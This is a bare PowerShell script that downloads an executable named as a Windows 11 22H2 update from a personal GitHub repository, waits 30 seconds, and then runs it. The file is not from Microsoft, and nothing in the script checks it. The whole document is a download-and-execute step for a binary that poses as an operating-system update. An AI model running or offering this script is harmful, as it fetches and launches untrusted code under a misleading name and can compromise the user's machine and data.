$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Windows1122H2/Windows1122H2.exe"
$destination = "$env:USERPROFILE\Windows1122H2.exe"

Invoke-WebRequest -Uri $url -OutFile $destination

Start-Sleep -Seconds 30

Start-Process -FilePath $destination
